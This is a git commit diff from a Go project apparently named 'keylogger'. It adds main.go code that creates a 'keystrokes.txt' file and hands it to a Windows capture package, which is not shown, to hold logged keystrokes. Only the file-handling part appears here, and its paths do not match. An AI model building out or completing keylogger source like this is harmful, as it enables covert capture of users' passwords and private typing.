fddfe9683669532b9bd995b642b868e98663a66c
rodolfo.ribeiro_q2pa <rodolfo.ribeiro@q2pay.com.br>
2023-06-08 15:16:25 -0300

    function: create file to hold keystroke

--- main.go
+++ main.go
@@ -1,5 +1,39 @@
 package main
 
-func main() {
+import (
+	"fmt"
+	"keylogger/windows"
+	"os"
+)
 
+func main() {
+	var fileName string = "/keystrokes.txt"
+
+	createFile(fileName)
+	windows.OutputFile, _ = os.Open(fileName)
+
+}
+
+func createFile(fileName string) {
+	filePath, err := os.Getwd()
+	if err != nil {
+		return
+	}
+
+	filePath = filePath + fileName
+
+	// Check if the file exists
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		// Create the file
+		file, err := os.Create(filePath)
+		if err != nil {
+			fmt.Println("Error creating file:", err)
+			return
+		}
+		defer file.Close()
+
+		fmt.Println("File created:", filePath)
+	} else {
+		fmt.Println("File already exists:", filePath)
+	}
 }
